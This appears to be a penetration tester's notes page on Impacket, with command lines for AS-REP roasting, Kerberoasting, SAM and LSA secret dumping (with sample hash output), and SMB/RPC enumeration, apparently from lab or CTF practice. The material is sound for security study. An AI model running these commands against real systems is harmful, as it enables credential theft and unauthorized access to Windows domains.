---
Description: Impacket is a collection of Python classes for working with network protocols.
URL: https://github.com/SecureAuthCorp/impacket/
---

>[!summary]
>[Impacket](https://github.com/SecureAuthCorp/impacket/) is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself. Packets can be constructed from scratch, as well as parsed from raw data, and the object oriented API makes it simple to work with deep hierarchies of protocols. The library provides a set of tools as examples of what can be done within the context of this library.
>
>Scripts can be found under the path `/usr/share/doc/python3-impacket/examples/`

### SMB Server

- [SMB Server](../Dev,%20scripting%20&%20OS/Dynamic%20Servers.md#SMB)

### Pass-the-Hash

[smbclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbclient.py)

### AS-REP Roasting

```bash
kali@kali:~$ GetNPUsers.py domain.local/user
...
TGT_HASH
...
kali@kali:~$  john tgt
```

### Dumping SAM

```bash
┌──(kali㉿kali)-[~/…/ntwk/student/5/loot]
└─$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam -security security -system system LOCAL
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x9cdfb1caf527c0ebdce1dc4677aefd96
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a8c8b7a37513b7eb9308952b814b522b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:05fa67eaec4d789ec4bd52f48e5a6b28:2733cdb0d8a1fec3f976f3b8ad1deeef:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:0f7a50dd4b95cec4c1dea566f820f4e7:::
alice:1004:aad3b435b51404eeaad3b435b51404ee:b74242f37e47371aff835a6ebcac4ffe:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:0f6ffb25902098cd2b3e8890856545f0e2ba142f427762e0e91c5084
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:3d9d86b905e39b1a0492d8ef88d7691c
...
0020   D1 43 ED 7C CA 89 05 22  CE 19 BF 71 D8 A6 2C E7   .C.|..."...q..,.
 0030   78 81 65 A8 16 92 CC C6  4A 2B 5F 52 96 0A 5F 2E   x.e.....J+_R.._.
NL$KM:550b6765af5f56ca365ab52b98073320c1405cee6ca822b599d7249f64d9c8c4d143ed7cca890522ce19bf71d8a62ce7788165a81692ccc64a2b5f52960a5f2e
[*] Cleaning up...
```

### mssqlclient.py

```bash
$ mssqlclient.py  -db volume -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP> #Recommended -windows-auth when you are going to use a domain. use as domain the netBIOS name of the machine
```

### rdp_check

```bash
$ rdp_check <domain>/<name>:<password>@<IP>
```

### samrdump.py

```bash
# Dump user information
/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]<targetName or address>
```

### rpcdump.py

```bash
# Map possible RPC endpoints
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]<targetName or address>
```

### GetUserSPNs

```bash
sudo ntpdate 10.10.10.100
impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request -o TGS
```

If you find this **error** from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)` it because of your local time, you need to synchronize the host with the DC: `ntpdate <IP of DC>`